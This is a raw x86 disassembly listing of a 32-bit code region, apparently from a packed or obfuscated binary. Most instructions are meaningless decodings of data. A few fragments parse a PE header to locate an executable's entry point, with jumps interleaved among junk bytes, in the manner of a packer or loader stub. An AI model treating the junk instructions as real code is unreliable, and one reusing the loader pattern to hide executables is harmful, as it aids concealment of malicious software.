  4186a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ab:	add    DWORD PTR [ebp+0xb413c53],ecx
  4186b1:	push   edx
  4186b2:	and    BYTE PTR [edx],0x5c
  4186b5:	(bad)  
  4186b6:	lock inc eax
  4186b8:	inc    edx
  4186b9:	or     edi,DWORD PTR [ebp-0x4659d7a9]
  4186bf:	sub    al,0x73
  4186c1:	retf   
  4186c2:	(bad)  
  4186c3:	fisttp WORD PTR [edi+0x16ad688]
  4186c9:	in     eax,dx
  4186ca:	in     eax,dx
  4186cb:	pop    ebp
  4186cc:	int3   
  4186cd:	xor    BYTE PTR [edi+0x15bbb8a5],0x94
  4186d4:	std    
  4186d5:	xor    DWORD PTR [ecx-0x71],0x6d87772b
  4186dc:	in     al,dx
  4186dd:	mov    ds:0x71d09d2a,al
  4186e2:	mov    ah,BYTE PTR [ebx+0x57]
  4186e5:	pop    ecx
  4186e6:	mov    esp,DWORD PTR [esi+0x7a2c6b34]
  4186ec:	test   eax,0x4c71a4a7
  4186f1:	push   esi
  4186f2:	ss pop edx
  4186f4:	mov    ds,WORD PTR [edi+0x591d3d6e]
  4186fa:	mov    ebx,0x6dc636fe
  4186ff:	jns    0x4186bd
  418701:	mov    dh,0xce
  418703:	or     eax,0xf2b41761
  418708:	stos   BYTE PTR es:[edi],al
  418709:	cld    
  41870a:	pushf  
  41870b:	mov    DWORD PTR ds:0xcae86126,esi
  418711:	call   0x98a8400f
  418716:	out    0x42,eax
  418718:	jle    0x4186ea
  41871a:	rol    DWORD PTR [ebp-0x6d09bb75],cl
  418720:	push   ss
  418721:	lahf   
  418722:	rcl    BYTE PTR [edx+0x265e4c65],0x9a
  418729:	jo     0x41870c
  41872b:	pop    ds
  41872c:	ins    DWORD PTR es:[edi],dx
  41872d:	fild   QWORD PTR [eax]
  41872f:	mov    ecx,0xb0a7280f
  418734:	inc    sp
  418736:	mov    edi,0x5bc9250a
  41873b:	pop    ebp
  41873c:	push   ebx
  41873d:	xchg   ebp,eax
  41873e:	mov    ch,0xb8
  418740:	(bad)  
  418741:	push   esi
  418742:	outs   dx,BYTE PTR ds:[esi]
  418743:	pop    es
  418744:	push   edx
  418745:	popa   
  418746:	std    
  418747:	mov    ebp,0xee114fe4
  41874c:	or     eax,0x3b23ca24
  418751:	add    cl,BYTE PTR [edx-0x38]
  418754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418755:	retf   
  418756:	iret   
  418757:	shl    BYTE PTR [eax+esi*1-0x25e93f9b],0x33
  41875f:	je     0x418738
  418761:	inc    edi
  418762:	out    dx,eax
  418763:	push   ebx
  418764:	jmp    0x418758
  418766:	mov    dh,0x87
  418768:	or     al,0xd9
  41876a:	sbb    BYTE PTR [edx-0x4aa2f66d],bl
  418770:	xlat   BYTE PTR ds:[ebx]
  418771:	test   DWORD PTR [eax+edx*1+0x49904d08],esi
  418778:	pop    esi
  418779:	mov    DWORD PTR [edx+edi*2+0x7f],ebx
  41877d:	mov    bh,0x20
  41877f:	aas    
  418780:	ffreep st(2)
  418782:	cmc    
  418783:	outs   dx,DWORD PTR ds:[esi]
  418784:	les    esp,FWORD PTR cs:[edi]
  418787:	stos   BYTE PTR es:[edi],al
  418788:	icebp  
  418789:	test   DWORD PTR [ecx-0x51],ebx
  41878c:	xchg   ebp,eax
  41878d:	mov    al,ds:0x9d6845dc
  418792:	jge    0x4187fd
  418794:	retf   0x14aa
  418797:	fldln2 
  418799:	ins    BYTE PTR es:[edi],dx
  41879a:	dec    ebx
  41879b:	mov    ebp,0x46d50d33
  4187a0:	add    ecx,esp
  4187a2:	imul   esp,DWORD PTR [eax-0x6],0xfcd29f1d
  4187a9:	pop    ds
  4187aa:	xlat   BYTE PTR ds:[ebx]
  4187ab:	jb     0x4187f5
  4187ad:	popa   
  4187ae:	enter  0x758b,0xb9
  4187b2:	pop    ds
  4187b3:	jg     0x418779
  4187b5:	pop    ebp
  4187b6:	push   0x9b578322
  4187bb:	stos   BYTE PTR es:[edi],al
  4187bc:	lgs    ebx,FWORD PTR [esi]
  4187bf:	out    0xe,al
  4187c1:	xchg   ecx,eax
  4187c2:	arpl   WORD PTR [ebx+ebp*8-0x60642c51],di
  4187c9:	jg     0x418780
  4187cb:	xor    esi,DWORD PTR [ebx]
  4187cd:	loope  0x41881f
  4187cf:	repz mov bh,0xa6
  4187d2:	pop    ebp
  4187d3:	test   al,0x5e
  4187d5:	scas   eax,DWORD PTR es:[edi]
  4187d6:	(bad)  
  4187d7:	outs   dx,BYTE PTR ds:[esi]
  4187d8:	mov    esp,0x764e6257
  4187dd:	pop    esi
  4187de:	icebp  
  4187df:	xchg   esi,eax
  4187e0:	jb     0x418776
  4187e2:	jbe    0x41880f
  4187e4:	cmp    eax,0xb3816bba
  4187e9:	hlt    
  4187ea:	adc    eax,DWORD PTR [ecx-0x3272973f]
  4187f0:	dec    DWORD PTR [ebx+0x3f033f1]
  4187f6:	jne    0x418800
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x9ba41af2
  41883e:	add    cl,dh
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	add    DWORD PTR [ebx],edx
  41884a:	mov    bh,0x6c
  41884c:	dec    esp
  41884d:	mov    ds:0x2ef16d36,al
  418852:	outs   dx,BYTE PTR ds:[esi]
  418853:	data16 rol bl,0x6b
  418857:	aaa    
  418858:	(bad)  
  418859:	sub    BYTE PTR [eax-0x724dbf70],dh
  41885f:	outs   dx,BYTE PTR ds:[esi]
  418860:	and    eax,0xaef91a0b
  418865:	xor    BYTE PTR [edx-0x47],bh
  418868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418869:	adc    ebx,DWORD PTR [ebp-0x2c]
  41886c:	ss int 0xb7
  41886f:	loopne 0x41888f
  418871:	fstp   st(4)
  418873:	mov    edi,0x8a921309
  418878:	shl    BYTE PTR ds:0xf0e365ab,cl
  41887e:	ds inc esi
  418880:	cmp    al,BYTE PTR [eax+0x183c0765]
  418886:	leave  
  418887:	mov    ecx,0xd916b87
  41888c:	loopne 0x4188e1
  41888e:	inc    esp
  41888f:	mov    dh,0x3
  418891:	iret   
  418892:	mov    dh,0xc
  418894:	mov    dh,0x9
  418896:	loop   0x4188d6
  418898:	icebp  
  418899:	xchg   edi,eax
  41889a:	adc    ecx,esi
  41889c:	sub    dh,al
  41889e:	lock and BYTE PTR [esi-0x5b7bbd4c],cl
  4188a5:	mov    ecx,0xab4aef9
  4188aa:	mov    bl,0x1f
  4188ac:	int3   
  4188ad:	add    DWORD PTR [ebp+edx*2+0x38],edi
  4188b1:	mov    al,0x39
  4188b3:	pop    ebx
  4188b4:	jmp    0x90f0b611
  4188b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ba:	sbb    DWORD PTR [edx-0x404168e7],ecx
  4188c0:	jmp    DWORD PTR [edx]
  4188c2:	shl    BYTE PTR [eax],cl
  4188c4:	sub    DWORD PTR [edx+edi*4],edx
  4188c7:	jne    0x41889e
  4188c9:	dec    edx
  4188ca:	sub    BYTE PTR [esi-0x1b903aca],0xfd
  4188d1:	leave  
  4188d2:	and    BYTE PTR [eax+0xc],0xe1
  4188d6:	xchg   edx,eax
  4188d7:	jns    0x418918
  4188d9:	sti    
  4188da:	mov    bl,0x5d
  4188dc:	pop    ss
  4188dd:	mov    dl,0x32
  4188df:	test   esi,edx
  4188e1:	sbb    eax,0xe1515c77
  4188e6:	jbe    0x4188d2
  4188e8:	les    ebp,FWORD PTR [esi-0xf]
  4188eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188ec:	repnz fist DWORD PTR [edx-0x55]
  4188f0:	pop    esp
  4188f1:	cdq    
  4188f2:	add    BYTE PTR [ecx-0xfd763],0x11
  4188f9:	push   esi
  4188fa:	pop    esp
  4188fb:	pop    edi
  4188fc:	nop
  4188fd:	ret    0xd281
  418900:	xchg   DWORD PTR [edx+eiz*2+0x4c],ecx
  418904:	imul   edx,DWORD PTR [edx+0x7e],0xffffffcb
  418908:	mov    WORD PTR [ebx],ss
  41890a:	int3   
  41890b:	dec    esp
  41890c:	pop    es
  41890d:	fisttp QWORD PTR [edx+0x4a7923df]
  418913:	ss cmc 
  418915:	or     BYTE PTR [esi+ebp*2],0xd0
  418919:	jp     0x418939
  41891b:	pop    esp
  41891c:	jle    0x418998
  41891e:	daa    
  41891f:	sub    ch,BYTE PTR [edx+0x322de314]
  418925:	pop    esp
  418926:	(bad)  
  418928:	mov    ds:0x45d9c19,al
  41892d:	adc    esi,DWORD PTR [eax+0x62349f53]
  418933:	jbe    0x4188d4
  418935:	jp     0x4189b4
  418937:	cs lahf 
  418939:	inc    esi
  41893a:	or     BYTE PTR [ecx-0x26ab9805],bl
  418940:	icebp  
  418941:	or     BYTE PTR [eax],0xd0
  418944:	push   ecx
  418945:	(bad)  
  418946:	loope  0x4188cb
  418948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418949:	sub    BYTE PTR [eax-0x1eb3e660],dl
  41894f:	push   eax
  418950:	xor    DWORD PTR [ecx+edi*4],0x33
  418954:	and    dh,BYTE PTR [esi+edi*2+0x1c]
  418958:	or     DWORD PTR [eax-0x64f5b90c],0xffffffd7
  41895f:	sub    ah,bh
  418961:	mov    cl,0x1a
  418963:	mov    ebx,0xcb8007ca
  418968:	mov    esi,0xc8f3614f
  41896d:	xor    ah,BYTE PTR [edx]
  41896f:	repz das 
  418971:	cmp    esi,DWORD PTR ds:0xc5577ada
  418977:	xchg   BYTE PTR [ebp-0x7],dh
  41897a:	push   ebx
  41897b:	dec    ecx
  41897c:	std    
  41897d:	add    DWORD PTR [edi-0x64eb2c01],esp
  418983:	sub    al,BYTE PTR [ebx+ecx*1+0x7ca41dee]
  41898a:	push   cs
  41898b:	sbb    BYTE PTR [edx],dh
  41898d:	adc    dh,BYTE PTR [eax]
  41898f:	or     esp,ebp
  418991:	mov    eax,0xe5be1aa1
  418996:	fst    DWORD PTR [ebp-0x46]
  418999:	fs and al,0x58
  41899c:	or     al,0x3f
  41899e:	mov    WORD PTR [edx+0x7fe62efd],fs
  4189a4:	add    DWORD PTR [ebx-0x5d],ebx
  4189a7:	adc    al,0xd4
  4189a9:	xchg   BYTE PTR ds:0xc8f16481,bl
  4189af:	mov    ebx,0x63bfa730
  4189b4:	popa   
  4189b5:	inc    esp
  4189b6:	mov    edx,0x6aa00637
  4189bb:	dec    ecx
  4189bc:	dec    esi
  4189bd:	enter  0xdf2c,0xa1
  4189c1:	cmp    eax,0xf12f178
  4189c6:	jno    0x418952
  4189c8:	jmp    0xb3c840ee
  4189cd:	test   al,0x9
  4189cf:	xor    edx,esp
  4189d1:	test   BYTE PTR [esi-0x35f84ae4],dh
  4189d7:	cmp    dh,BYTE PTR [edi+0x5abbdcf4]
  4189dd:	sahf   
  4189de:	xor    BYTE PTR [edx-0x7],bh
  4189e1:	or     eax,0xc7c701c3
  4189e6:	fisubr DWORD PTR [ecx]
  4189e8:	xchg   edx,eax
  4189e9:	(bad)  
  4189eb:	adc    al,0x87
  4189ed:	inc    edx
  4189ee:	and    bh,bl
  4189f0:	mov    al,0x8a
  4189f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189f3:	and    BYTE PTR [edx-0x5a0d5a5f],ah
  4189f9:	out    dx,eax
  4189fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fb:	daa    
  4189fc:	cmp    eax,0xf004305b
  418a01:	pop    ebp
  418a02:	push   edi
  418a03:	or     BYTE PTR [ebx-0x66],al
  418a06:	ja     0x418995
  418a08:	mov    ch,0x5
  418a0a:	dec    edi
  418a0b:	dec    esi
  418a0c:	pop    esi
  418a0d:	out    dx,al
  418a0e:	ins    DWORD PTR es:[edi],dx
  418a0f:	sub    al,0xa8
  418a11:	es adc eax,0x43afc1b8
  418a17:	sbb    al,0xcc
  418a19:	inc    ecx
  418a1a:	fs mov bl,0xbe
  418a1d:	sbb    BYTE PTR [esi+0x3c85a3ce],cl
  418a23:	jno    0x4189e8
  418a25:	out    0xff,eax
  418a27:	sbb    bh,al
  418a29:	nop    esi
  418a2c:	ficom  DWORD PTR [edx+eax*2]
  418a2f:	pop    es
  418a30:	hlt    
  418a31:	cmp    BYTE PTR [edx],ah
  418a33:	jo     0x418a4a
  418a35:	aad    0x88
  418a37:	ret    0x2fc4
  418a3a:	mov    ds:0xeba9daa6,al
  418a3f:	popf   
  418a40:	cld    
  418a41:	add    al,bl
  418a43:	int3   
  418a44:	mov    DWORD PTR [eax],ebp
  418a46:	push   edi
  418a47:	mov    ch,0xa9
  418a49:	sbb    al,0x25
  418a4b:	daa    
  418a4c:	push   eax
  418a4d:	shl    BYTE PTR [eax-0x3b4b051b],1
  418a53:	ja     0x418a24
  418a55:	pop    ecx
  418a56:	xchg   ebp,eax
  418a57:	mov    dl,0x73
  418a59:	pushf  
  418a5a:	call   0x11e1:0x5bf065c7
  418a61:	xor    DWORD PTR [esp+eiz*2],edx
  418a64:	or     DWORD PTR [ebx-0x7],0xfffffff6
  418a68:	jne    0x418a53
  418a6a:	add    dl,BYTE PTR [ebp+eiz*1+0x29]
  418a6e:	loop   0x418aa0
  418a70:	or     esi,DWORD PTR [edx+edi*8-0x50daf2e8]
  418a77:	outs   dx,DWORD PTR ds:[esi]
  418a78:	pop    DWORD PTR [edi*1-0x735ae66a]
  418a7f:	repnz sar ah,1
  418a82:	cmp    eax,edi
  418a84:	jle    0x418a6a
  418a86:	push   edi
  418a87:	cmp    ch,BYTE PTR [esp+esi*2]
  418a8a:	and    al,0xe6
  418a8c:	in     al,dx
  418a8d:	adc    DWORD PTR [eax+eiz*4],esp
  418a90:	add    bl,BYTE PTR [eax]
  418a92:	or     DWORD PTR [eax+0x2863a1d4],esi
  418a98:	add    BYTE PTR [ebx-0x4f],al
  418a9b:	lds    esi,FWORD PTR [esi+ebp*8+0x5ef43a24]
  418aa2:	cmp    ah,BYTE PTR [ecx-0x52]
  418aa5:	jnp    0x418afb
  418aa7:	mov    dh,0x26
  418aa9:	mov    ch,0xde
  418aab:	mov    al,ds:0x5fb8c225
  418ab0:	mov    dh,0xb5
  418ab2:	mov    ebx,0x36ba836e
  418ab7:	scas   al,BYTE PTR es:[edi]
  418ab8:	cdq    
  418ab9:	and    edi,esi
  418abb:	push   ebx
  418abc:	push   0x706e8abb
  418ac1:	cmp    edi,DWORD PTR [eax-0x69]
  418ac4:	ror    BYTE PTR [edi-0x2ffd8c25],cl
  418aca:	jns    0x418acb
  418acc:	push   edx
  418acd:	jne    0x418aca
  418acf:	push   eax
  418ad0:	call   0x616f:0xfbf54290
  418ad7:	sbb    al,BYTE PTR [ecx+0x4f]
  418ada:	jecxz  0x418b50
  418adc:	in     eax,dx
  418add:	int3   
  418ade:	fldcw  WORD PTR ds:0xc027a564
  418ae4:	popf   
  418ae5:	sbb    DWORD PTR es:[ebx-0x45],edx
  418ae9:	mov    ch,0x1b
  418aeb:	repnz in eax,0x10
  418aee:	lock sub DWORD PTR [ebp*4-0xf2c2ac6],edi
  418af6:	jecxz  0x418ac7
  418af8:	push   edi
  418af9:	stos   DWORD PTR es:[edi],eax
  418afa:	lahf   
  418afb:	inc    esp
  418afc:	mov    ah,0xb2
  418afe:	xchg   ebp,eax
  418aff:	cmp    ah,BYTE PTR [edi-0x489345d2]
  418b05:	int    0x3c
  418b07:	push   eax
  418b08:	sub    ebx,edx
  418b0a:	xor    ecx,DWORD PTR [edx+eiz*2]
  418b0d:	(bad)  
  418b0f:	stc    
  418b10:	dec    eax
  418b11:	dec    esp
  418b12:	lods   eax,DWORD PTR ds:[esi]
  418b13:	jbe    0x418b1f
  418b15:	ins    DWORD PTR es:[edi],dx
  418b16:	xchg   ecx,eax
  418b17:	xor    DWORD PTR [eax+eax*2],0xffffff94
  418b1b:	xchg   edi,eax
  418b1c:	bound  esi,QWORD PTR [ebx]
  418b1e:	scas   al,BYTE PTR es:[edi]
  418b1f:	push   ebx
  418b20:	mov    DWORD PTR [ebp+0x13],0xf13a67a6
  418b27:	psubusw mm6,mm2
  418b2a:	mov    ch,0xb6
  418b2c:	out    dx,eax
  418b2d:	pop    DWORD PTR [edx+0x28]
  418b30:	pop    ebp
  418b31:	add    DWORD PTR [ecx+0x1b],eax
  418b34:	dec    ecx
  418b35:	mov    bl,0xfb
  418b37:	ds cmp ah,al
  418b3a:	jnp    0x418b10
  418b3c:	jp     0x418af2
  418b3e:	pop    ecx
  418b3f:	push   cs
  418b40:	jmp    0x4a5393d1
  418b45:	push   DWORD PTR ds:0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	pop    edx
  418b63:	enter  0x3942,0x12
  418b67:	ret    
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	cmp    DWORD PTR [eax],0xd29590d9
  418b74:	mov    cl,ch
  418b76:	retf   
  418b77:	ret    
  418b78:	shr    ch,1
  418b7a:	add    ebp,DWORD PTR [esi+0xe]
  418b7d:	jecxz  0x418bb2
  418b7f:	jg     0x418bf7
  418b81:	out    0x59,eax
  418b83:	pusha  
  418b84:	cmp    al,0xf2
  418b86:	gs adc al,0xd7
  418b89:	or     BYTE PTR [edx+ecx*1-0x6d08a63f],dl
  418b90:	test   BYTE PTR [edx+0x0],dh
  418b93:	pop    eax
  418b94:	bound  edi,QWORD PTR [edx+ebp*8]
  418b97:	lahf   
  418b98:	adc    al,0x7b
  418b9a:	pop    esi
  418b9b:	mov    ch,0xf7
  418b9d:	mov    esi,fs
  418b9f:	add    eax,0x770b66a
  418ba4:	(bad)  
  418ba5:	sub    eax,0xf18f7262
  418baa:	sahf   
  418bab:	mov    al,0xe7
  418bad:	call   0xc76f:0xb2023dc5
  418bb4:	add    BYTE PTR [ebx+0x4c9953f6],bl
  418bba:	repz push cs
  418bbc:	aaa    
  418bbd:	push   ecx
  418bbe:	rcr    DWORD PTR [esp+esi*1],1
  418bc1:	xchg   DWORD PTR [ecx],edi
  418bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bc4:	sub    BYTE PTR [edi-0x760f0325],dh
  418bca:	sbb    BYTE PTR [edi],bl
  418bcc:	sub    eax,0x272c2bc5
  418bd1:	inc    ebx
  418bd2:	shr    DWORD PTR [edi+0x51],cl
  418bd5:	xchg   DWORD PTR [eax+0x2d3079eb],edx
  418bdb:	pop    esi
  418bdc:	icebp  
  418bdd:	loopne 0x418b5f
  418bdf:	inc    edi
  418be0:	xor    ecx,DWORD PTR [ecx+0x44]
  418be3:	and    bh,BYTE PTR [ecx+0x7a385c0b]
  418be9:	daa    
  418bea:	adc    eax,edi
  418bec:	std    
  418bed:	nop
  418bee:	ficomp WORD PTR [edi]
  418bf0:	mov    ebp,0xaf785d70
  418bf5:	push   eax
  418bf6:	test   eax,0xd3b02278
  418bfb:	pop    ebp
  418bfc:	jecxz  0x418c6d
  418bfe:	cmp    esp,DWORD PTR [ebp+eiz*8+0x3eaab5f0]
  418c05:	rcr    ebp,0xd0
  418c08:	sar    DWORD PTR [esi+0x12],1
  418c0b:	inc    ebp
  418c0c:	les    ebp,FWORD PTR [esi*8+0x44ec56ee]
  418c13:	cmp    edi,eax
  418c15:	xchg   ebp,eax
  418c16:	out    dx,al
  418c17:	js     0x418c7d
  418c19:	mov    bh,0x37
  418c1b:	cmp    bh,cl
  418c1d:	pushw  cs
  418c1f:	xchg   ecx,eax
  418c20:	inc    edi
  418c21:	retf   
  418c22:	mov    ebx,DWORD PTR ds:[eax]
  418c25:	addr16 mov bl,0xe2
  418c28:	int    0x83
  418c2a:	dec    edx
  418c2b:	push   es
  418c2c:	xor    al,0xa6
  418c2e:	push   esp
  418c2f:	xor    DWORD PTR [ebx+0x46],esp
  418c32:	test   eax,0xc321273c
  418c37:	xor    bh,cl
  418c39:	jae    0x418caf
  418c3b:	and    dh,al
  418c3d:	fwait
  418c3e:	mov    bh,0x65
  418c40:	or     ch,BYTE PTR [edi-0x6305c245]
  418c46:	shr    dh,1
  418c48:	ja     0x418cb2
  418c4a:	ds jae 0x418c13
  418c4d:	out    dx,al
  418c4e:	aaa    
  418c4f:	pop    ecx
  418c50:	cmp    al,0x56
  418c52:	adc    ch,ch
  418c54:	scas   al,BYTE PTR es:[edi]
  418c55:	sub    al,0xfb
  418c57:	inc    edi
  418c58:	add    cl,ch
  418c5a:	push   cs
  418c5b:	(bad)  
  418c5c:	mov    ebx,0xe946b5f5
  418c61:	fist   DWORD PTR [ebx+ecx*2]
  418c64:	fs inc ecx
  418c66:	out    0x8d,eax
  418c68:	fisubr WORD PTR [edx]
  418c6a:	and    ch,dl
  418c6c:	pop    eax
  418c6d:	sbb    eax,0x96878fed
  418c72:	out    0x71,al
  418c74:	(bad)  
  418c75:	cdq    
  418c76:	lock pop es
  418c78:	add    eax,0x16aa448a
  418c7d:	js     0x418cfb
  418c7f:	push   eax
  418c80:	mov    eax,0x55e4306b
  418c85:	sub    eax,0x5bdbe396
  418c8a:	push   edi
  418c8b:	cwde   
  418c8c:	icebp  
  418c8d:	jmp    0x418c32
  418c8f:	pop    ds
  418c90:	les    edi,FWORD PTR [edx-0x7fe7bc5d]
  418c96:	xchg   BYTE PTR [edi],bh
  418c98:	out    0xb3,eax
  418c9a:	xchg   ebx,eax
  418c9b:	into   
  418c9c:	retf   
  418c9d:	ss xchg edi,eax
  418c9f:	arpl   WORD PTR [ecx],bp
  418ca1:	adc    eax,0x66649e3f
  418ca6:	jb     0x418d19
  418ca8:	ret    
  418ca9:	inc    edx
  418caa:	adc    eax,edx
  418cac:	add    esi,DWORD PTR [edi]
  418cae:	xor    BYTE PTR [edx],cl
  418cb0:	add    bh,BYTE PTR [eax]
  418cb2:	mov    esi,0x8922ae65
  418cb7:	fbld   TBYTE PTR [edx+0x21]
  418cba:	ins    BYTE PTR es:[edi],dx
  418cbb:	add    BYTE PTR [ebp+0x190ac1de],al
  418cc1:	inc    ecx
  418cc2:	xlat   BYTE PTR ds:[ebx]
  418cc3:	push   cs
  418cc4:	push   0xffffffaf
  418cc6:	cmp    eax,0x5977d5bd
  418ccb:	rcr    edi,cl
  418ccd:	cmp    bl,BYTE PTR [edi+eax*8]
  418cd0:	dec    eax
  418cd1:	aaa    
  418cd2:	rcl    DWORD PTR [ecx+0x57],1
  418cd5:	lods   eax,DWORD PTR ds:[esi]
  418cd6:	mov    dh,0x6c
  418cd8:	cmp    al,0x5e
  418cda:	(bad)  
  418cdb:	pusha  
  418cdc:	stos   BYTE PTR es:[edi],al
  418cdd:	push   cs
  418cde:	inc    eax
  418cdf:	repnz push edx
  418ce1:	imul   eax,DWORD PTR [ecx+0x55],0xa
  418ce5:	clc    
  418ce6:	inc    eax
  418ce7:	jmp    0xda82c03c
  418cec:	xchg   BYTE PTR [esi],al
  418cee:	jg     0x418d66
  418cf0:	sbb    BYTE PTR [eax-0x11],dh
  418cf3:	mov    ch,0x9d
  418cf5:	inc    esi
  418cf6:	icebp  
  418cf7:	into   
  418cf8:	sbb    dl,BYTE PTR [edi]
  418cfa:	jecxz  0x418cb5
  418cfc:	mov    dh,0xa3
  418cfe:	js     0x418ccc
  418d00:	or     DWORD PTR [ebp-0x2d81fafc],ecx
  418d06:	sti    
  418d07:	mov    DWORD PTR [ebx+0x46],0x3ab70234
  418d0e:	add    DWORD PTR [ebx-0x1f496a9],eax
  418d14:	jnp    0x418cb5
  418d16:	push   edi
  418d17:	shl    BYTE PTR ds:0x4456ac55,cl
  418d1d:	bound  ebx,QWORD PTR [eax]
  418d1f:	and    al,0xb5
  418d21:	xor    esp,edi
  418d23:	sbb    ebp,DWORD PTR [esp+ebx*1-0x26dcd97d]
  418d2a:	call   0xa17f2a1f
  418d2f:	xor    eax,0x123f9dec
  418d34:	or     eax,0x75262fbd
  418d39:	jae    0x418d21
  418d3b:	push   ebx
  418d3c:	popf   
  418d3d:	pop    ds
  418d3e:	iret   
  418d3f:	fwait
  418d40:	dec    esp
  418d41:	mov    ah,0xb2
  418d43:	xor    edx,DWORD PTR [ecx-0x5a]
  418d46:	scas   eax,DWORD PTR es:[edi]
  418d47:	xchg   esi,eax
  418d48:	push   ecx
  418d49:	inc    ebp
  418d4a:	gs sub eax,0x408d8f5e
  418d50:	mov    ds:0x74e9e231,eax
  418d55:	sbb    DWORD PTR [eax-0x61],0xffffffe3
  418d59:	add    eax,0x101bfae5
  418d5e:	or     ecx,ecx
  418d60:	push   ds
  418d61:	fild   DWORD PTR [edx-0x24]
  418d64:	lds    esp,FWORD PTR [esi]
  418d66:	adc    DWORD PTR [edi+0x45],ebx
  418d69:	dec    esi
  418d6a:	sbb    al,BYTE PTR [edi]
  418d6c:	mov    bl,0x89
  418d6e:	aas    
  418d6f:	rcl    DWORD PTR [edi],1
  418d71:	ja     0x418dc4
  418d73:	add    esp,ebp
  418d75:	imul   eax,DWORD PTR [ecx+0x2fa973a4],0x9de76cdb
  418d7f:	adc    al,0x9
  418d81:	jmp    0xf9759056
  418d86:	mov    ds:0x15523867,al
  418d8b:	pcmpgtb mm6,QWORD PTR [esp+ecx*1]
  418d8f:	cdq    
  418d90:	mov    al,ds:0xd0205505
  418d95:	jnp    0x418e03
  418d97:	mov    es,WORD PTR [ebx]
  418d99:	or     eax,0x7c36b96a
  418d9e:	fsub   QWORD PTR [edi+0x5beea795]
  418da4:	loop   0x418d7a
  418da6:	sub    eax,0x3e7f1fc9
  418dab:	les    edi,FWORD PTR [edx-0x1c]
  418dae:	stc    
  418daf:	int3   
  418db0:	out    0x5b,al
  418db2:	adc    eax,0x55c5214f
  418db7:	xchg   ecx,eax
  418db8:	mov    ebp,0xccc9acba
  418dbd:	dec    eax
  418dbe:	mov    dh,0xa1
  418dc0:	adc    esi,DWORD PTR [edx]
  418dc2:	jge    0x418da0
  418dc4:	fcmovne st,st(2)
  418dc6:	jg     0x418d7a
  418dc8:	mov    eax,0xbaf365
  418dcd:	stc    
  418dce:	dec    edi
  418dcf:	leave  
  418dd0:	jb     0x418dbc
  418dd2:	int3   
  418dd3:	inc    esp
  418dd4:	lods   al,BYTE PTR ds:[esi]
  418dd5:	sbb    BYTE PTR [ebp-0x734693bb],ah
  418ddb:	sbb    cl,BYTE PTR [ecx-0x9]
  418dde:	in     eax,0x4f
  418de0:	sub    eax,0xd06a9c0a
  418de5:	or     BYTE PTR [ebx-0x7d7663e3],al
  418deb:	jp     0x418e24
  418ded:	sub    al,0x56
  418def:	jmp    0x33b3:0xfe121679
  418df6:	cld    
  418df7:	sbb    al,0xdc
  418df9:	add    DWORD PTR [edi-0x5],edi
  418dfc:	add    edx,esi
  418dfe:	nop
  418dff:	push   esi
  418e00:	retf   
  418e01:	repnz xor al,0x50
  418e04:	pop    esp
  418e05:	xchg   esi,eax
  418e06:	sbb    ecx,DWORD PTR [edx]
  418e08:	jge    0x418d97
  418e0a:	les    ebx,FWORD PTR [esi]
  418e0c:	(bad)  
  418e0d:	(bad)  
  418e0e:	js     0x418ddc
  418e10:	adc    al,0xfb
  418e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e13:	sbb    ebp,DWORD PTR [ebp+ebx*8-0x3f]
  418e17:	leave  
  418e18:	push   ebp
  418e19:	inc    ebp
  418e1a:	call   0xd4ab:0xe452befa
  418e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e22:	push   ebx
  418e23:	xlat   BYTE PTR ds:[ebx]
  418e24:	fs popa 
  418e26:	mov    cl,0x67
  418e28:	in     al,dx
  418e29:	mov    esp,DWORD PTR [edx+0x5e]
  418e2c:	pop    ebx
  418e2d:	in     eax,0xbc
  418e2f:	xchg   ebp,eax
  418e30:	lods   al,BYTE PTR ds:[esi]
  418e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e32:	mov    ?,ebp
  418e34:	sub    esp,esp
  418e36:	cdq    
  418e37:	mov    esp,0x39b8ddd9
  418e3c:	scas   al,BYTE PTR es:[edi]
  418e3d:	test   BYTE PTR [esp+ebp*4],0x93
  418e41:	mov    dl,0xe5
  418e43:	inc    esi
  418e44:	je     0x418e4f
  418e46:	in     eax,dx
  418e47:	call   0xfe55:0xd35f5195
  418e4e:	retf   0xcf60
  418e51:	mov    DWORD PTR [edx+0x3ed842d6],esi
  418e57:	and    al,0x90
  418e59:	xchg   ebx,eax
  418e5a:	fisttp WORD PTR [eax]
  418e5c:	(bad)  
